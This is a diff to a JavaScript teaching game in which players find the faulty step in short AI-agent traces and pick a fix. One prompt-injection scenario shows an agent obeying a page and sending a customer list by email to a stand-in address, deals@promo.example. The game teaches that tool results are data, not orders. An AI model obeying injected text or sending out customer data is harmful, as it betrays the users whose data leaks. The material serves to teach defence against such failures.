@@ -538,7 +538,7 @@
   }
   function fix(n, icon, title, idea, key, cases) {
     TRACK.list.push({ id: TRACK.prefix + '-fix-' + n, game: 'fix', icon: icon, title: title, tag: 'Debug ' + n,
-      idea: idea, play: 'Tap the first step that went wrong. Then pick the fix.', key: key, cases: cases });
+      idea: idea, play: 'Tap the first step where the agent made a mistake. Then pick the fix.', key: key, cases: cases });
   }
 
   /* A boss is one scenario that needs several lessons at once. Each decision is tied to a concept,
@@ -1328,7 +1328,7 @@
       X('a06-fail', 'Book a table for four on Friday.', [
         T('act', 'find_tables(day="Friday", guests=4)'),
         T('obs', 'No tables on Friday.'),
-        T('think', 'That did not work.'),
+        T('think', 'No tables came back.'),
         B('act', 'find_tables(day="Friday", guests=4)'),
         T('obs', 'No tables on Friday.')
       ], 'Repeating a failed step', 'Re-plan: try another day or ask the user',
@@ -1341,7 +1341,7 @@
         T('act', 'send_email("deals@promo.example", customer_list)')
       ], 'Prompt injection', 'Treat tool results as data, never as instructions',
         ['Ask the model to double-check its summary', 'Shorten the reviews before reading them'],
-        'Text that comes back from a tool is content to work on. Only the user and the system prompt give orders.'),
+        'The page is allowed to contain anything. The mistake is obeying it: text from a tool is content to work on. Only the user and the system prompt give orders.'),
       X('a05-rot', 'Step 40 of a long refactor: rename the last function.', [
         T('think', 'One function left to rename.'),
         B('act', 'Load all 30 files into the context again, to be safe'),
@@ -1349,7 +1349,7 @@
         T('think', 'What was the naming rule? I will guess.'),
         T('act', 'rename_function("calc", "Calculate_2")')
       ], 'Context rot', 'Keep only what this step needs',
-        ['Paste the naming rule in three more times', 'Move to a model with a larger window'],
+        ['Reload every file at each step, to stay fresh', 'Move to a model with a larger window'],
         'A window stuffed with old material buries the facts that matter. Curate what goes in.'),
       X('a03-design', 'Cancel order 1182.', [
         T('think', 'Two tools might fit: process(id, mode) and update(id, flag).'),
@@ -2018,12 +2018,12 @@
     'Validate output, answer from the sources, compact with care, and size the model to the job.', [
       X('l03-validate', 'Extract the invoice total as JSON.', [
         T('act', 'Ask the model for JSON with a number field "total"'),
-        T('obs', 'Reply: {"total": "about 400"'),
+        T('obs', 'The model replies: {"total": "about 400"}'),
         B('act', 'Send the reply straight to the billing system'),
         T('obs', 'Billing crashed: invalid input')
       ], 'Unchecked model output', 'Validate against the schema and retry on failure',
         ['Ask for a longer reply', 'Lower the temperature to zero'],
-        'A model can return a broken shape at any temperature. Check it, and send the error back for another try.'),
+        'A bad reply is normal; not checking it is the bug. A model can return the wrong shape at any temperature, so check it and send the error back for another try.'),
       X('l06-ground', 'What is our parental leave policy?', [
         T('act', 'search_docs("parental leave")'),
         T('obs', '2 passages found: HR-12, HR-40'),
@@ -2405,12 +2405,12 @@
         B('act', 'call = json.loads(reply), with nothing to catch an error'),
         T('obs', 'JSONDecodeError. The agent exits.')
       ], 'A crash on bad JSON', 'Catch the error and ask the model again',
-        ['Print the reply before parsing it', 'Parse the reply twice'],
-        'Models sometimes add words around the JSON. Expect it: catch the error and send it back.'),
+        ['Print the reply before parsing it', 'Switch to a larger model'],
+        'A bad reply is normal; not handling it is the bug. Models sometimes add words around the JSON, so catch the error and send it back.'),
       X('p07-stateless', 'And what about my second order?', [
         T('obs', 'The request lands on copy B'),
-        B('act', 'history = CHATS[user_id], a dict in this process'),
-        T('obs', 'KeyError: copy B has never seen this user'),
+        B('act', 'history = CHATS.get(user_id, []), a dict in this process'),
+        T('obs', 'Empty list: copy B has never seen this user'),
         T('answer', '"Hello! How can I help?"')
       ], 'State kept in one process', 'Load the history from a database',
         ['Copy the dict into the image at build time', 'Give each copy more memory'],
@@ -2421,7 +2421,7 @@
         T('obs', 'Error rate: 2% → 9%'),
         T('think', 'Every customer is affected. Start debugging live.')
       ], 'A release with no stages', 'Release to a small share first',
-        ['Skip the evals to ship sooner', 'Deploy at night'],
+        ['Add more evals until nothing slips through', 'Deploy at night'],
         'Passing tests is not proof. A small first share shows the problem while rolling back is cheap.')
     ]);
 
